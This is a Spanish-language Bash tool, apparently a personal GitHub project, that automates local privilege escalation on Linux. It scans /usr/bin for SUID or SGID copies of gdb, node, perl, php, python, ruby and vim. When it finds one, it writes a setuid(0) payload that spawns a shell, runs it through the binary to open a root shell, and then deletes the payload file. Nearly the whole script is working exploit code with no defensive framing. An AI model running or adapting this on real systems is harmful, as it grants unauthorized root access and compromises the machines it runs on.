#!/bin/bash

#Colours
greenColour="\e[1;32m\033[1m"
endColour="\033[1m\e[0m"
redColour="\e[1;31m\033[1m"
blueColour="\e[1;34m\033[1m"
yellowColour="\e[1;33m\033[1m"
purpleColour="\e[1;35m\033[1m"
turquoiseColour="\e[1;36m\033[1m"
grayColour="\e[1;37m\033[1m"
celesteColour="\e[1;96m"
whiteColour="\e[1;37m"
darkPurple="\e[1;35m"


#Functions

function clean_console(){
  sleep 1
  clear
}

function banner() {
  echo -e "\n ${blueColour}__      .____     _____     _____ ____  ___       __${endColour} "
  echo -e " ${blueColour}\ \     |    |      /  |  |   /  |  |\   \/  /     / /${endColour} "
  echo -e " ${redColour} \ \    |    |     /   |  |_ /   |  |_\     /     / /${endColour}           ${purpleColour}👑${endColour} ${yellowColour}GitHub${endColour} ${redColour}>${endColour} ${whiteColour}https://${endColour}${redColour}github.com/${endColour}${whiteColour}claudiosc01${endColour}"
  echo -e " ${redColour} / /    |    |___ /    ^   //    ^   //     \     \ \ ${endColour} "
  echo -e " ${blueColour}/_/     |_______ \\____   | \____   |/___/\  \      \_\ ${endColour}"
  echo -e " ${blueColour}                \/     |__|      |__|      \_/         ${endColour}"
  echo -e "                                                       "  
  echo -e "                          [${redColour}███${endColour}${whiteColour}███${endColour}${redColour}███${endColour}] \n"

}


function tools_on_updated(){
  echo -e "${greenColour}[${endColour}${redColour}!${endColour}${greenColour}]${endColour}${whiteColour} Esta herramienta aun se encuentra en la version v1${endColour}\n"
  
  echo -e "   ${turquoiseColour}>${endColour} ${blueColour}Opciones Activas:${endColour}\n"
  
  echo -e "         ${celesteColour}[${endColour}${purpleColour}1${endColour}${celesteColour}]${endColour} ${darkPurple}Buscar vulnerabilidaes con Privilegios SUID SGID ${endColour}"

  echo -e "         ${celesteColour}[${endColour}${purpleColour}q${endColour}${celesteColour}]${endColour} ${darkPurple}Salir de la herramienta :( ${endColour}"


  echo -e "\n==============================================================="
    
}


function vul_suid_sgid(){

  echo -e "\n${whiteColour}[${endColour}${celesteColour}+${endColour}${whiteColour}]${endColour} ${celesteColour}Buscando Vulnerabilidades por SUID...${endColour}"

  bins_vul_suid_sgid=("gdb*" "node*" "perl" "php*" "python*" "ruby*" "view" "vim" "vimdiff")  


  bins_vul_suid_sgid_file=(
  'python import os; os.setuid(0); os.system("/bin/bash")'
  'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
  '#!/usr/bin/perl -T 
   use POSIX qw(setuid);
   $ENV{"PATH"} = "/bin:/usr/bin";
   POSIX::setuid(0);
   system "/bin/bash";'
  '<?php posix_setuid(0); system("/bin/bash"); ?>'
  'import os; os.setuid(0); os.system("/bin/bash")'
  'Process::Sys.setuid(0); exec "/bin/sh"'
   


  ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  
  ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  
  ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

)

  bins_vul_suid_sgid_file_ext=(
    'gdbFileVul.gdb'
    'nodeFileVul.js'
    'perlFileVul.pl'
    'phpFileVul.php'
    'pythonFileVul.py'
    'rubyFileVul.rb'
    'viewFileVul.sh'
    'vimFileVul.vim'
    'vimdiffFileVul'
  )


  echo -e "\n${whiteColour}[${endColour}${celesteColour}+${endColour}${whiteColour}]${endColour}${celesteColour} Obtiendo Vulnerabilidades...${endColour}\n"

  for index in "${!bins_vul_suid_sgid[@]}"; do
  vul_bin="${bins_vul_suid_sgid[$index]}"
  ext="${bins_vul_suid_sgid_file_ext[$index]}"
  #echo "Procesando $vul_bin con extensión $ext"


  if [ -e "$(find /usr/bin/ -name "$vul_bin" -type f -perm /4000 )" ]; then
    

    echo -e "${whiteColour}[${endColour}${redColour}!${endColour}${whiteColour}]${endColour}${celesteColour} Si encontramos permisos con SUID, Entraras automaticamente como usuario root${endColour} ${blueColour}:)${endColour} "
    sleep 4
  
      if [ "$(find /usr/bin/ -name "$vul_bin" -type f -perm /4000)" == "/usr/bin/gdb" ]; then
        clear
        echo -e "          ${blueColour}>${endColour}${celesteColour} G00D${endColour} ${redColour}H4CK1NG${endColour} ${turquoiseColour}:3${endColour}"
        gdb -ex "source $ext" -ex 'python import os; os.setuid(0); os.system("/bin/bash")' -ex 'quit'
        rm $ext
        break
      fi
    
    
    clear
    echo -e "          ${blueColour}>${endColour}${celesteColour} G00D${endColour} ${redColour}H4CK1NG${endColour} ${turquoiseColour}:3${endColour}"
    echo -e "${bins_vul_suid_sgid_file[$index]}" > "$ext"
    chmod +x $ext
    $(find /usr/bin/ -name "$vul_bin" -type f -perm /4000) $ext
    rm $ext
    break    

  fi

 if [ -e "$(find /usr/bin/ -name "$vul_bin" -type f -perm /2000 )" ]; then
    

    echo -e "${whiteColour}[${endColour}${redColour}!${endColour}${whiteColour}]${endColour}${celesteColour} Si encontramos permisos con SGID, Entraras automaticamente como usuario root${endColour} ${blueColour}:)${endColour} "
    sleep 4
  
      if [ "$(find /usr/bin/ -name "$vul_bin" -type f -perm /2000)" == "/usr/bin/gdb" ]; then
        clear
        echo -e "          ${blueColour}>${endColour}${celesteColour} G00D${endColour} ${redColour}H4CK1NG${endColour} ${turquoiseColour}:3${endColour}"
        gdb -ex "source $ext" -ex 'python import os; os.setuid(0); os.system("/bin/bash")' -ex 'quit'
        rm $ext
        break
      fi
    
    
    clear
    echo -e "          ${blueColour}>${endColour}${celesteColour} G00D${endColour} ${redColour}H4CK1NG${endColour} ${turquoiseColour}:3${endColour}"
    echo -e "${bins_vul_suid_sgid_file[$index]}" > "$ext"
    chmod +x $ext
    $(find /usr/bin/ -name "$vul_bin" -type f -perm /2000) $ext
    rm $ext
    break    

  fi


  if [[ "$(find /usr/bin/ -name "$vul_bin")" == "/usr/bin/view" || "$(find /usr/bin/ -name "$vul_bin")" == "/usr/bin/vim" || "$(find /usr/bin/ -name "$vul_bin")" == "/usr/bin//vimdiff"  ]]; then

    echo -e "\n${whiteColour}=================${endColour}${redColour}=================${endColour}${whiteColour}================${endColour}\n"
    
    echo -e " ${redColour}>${endColour} ${purpleColour}[${endColour}${redColour}!${endColour}${purpleColour}]${endColour}${blueColour} Cuando estes dentro de Vim, Abrir terminal con:${endColour}${yellowColour}  :term${endColour} ${turquoiseColour}:)${endColour}"
    echo -e "            ${redColour}>${endColour} ${purpleColour}[${endColour}${redColour}!${endColour}${purpleColour}]${endColour}${blueColour} Si por X razon no entras como usuario root, es porque no pudimos escalar privilegios${endColour} ${redColour}:(${endColour}" 
    
  
  echo -e "\n${whiteColour}=================${endColour}${redColour}=================${endColour}${whiteColour}================${endColour}\n"

    echo -e "${bins_vul_suid_sgid_file[$index]}" > "$ext"
    chmod +x $ext
    $(find /usr/bin/ -name "$vul_bin") $ext
    rm $ext
    break
  fi

  done

echo -e "\n==============================================================="
}


function call_functions(){
  while true 
  do 
    tools_on_updated
    echo -n "Selecciona una opcion: "; read -r opcion

    case $opcion in 
      1)
        vul_suid_sgid;;
      q)
        echo -e "\n                       ${redColour}>${endColour}${yellowColour} G00D D4Y${endColour} ${celesteColour}:3${endColour}"
        break;;
    esac
  done
}


#Main function :3
function main(){
  tput civis
  clean_console
  banner
  sleep 2
  tput cnorm
  call_functions
}


main




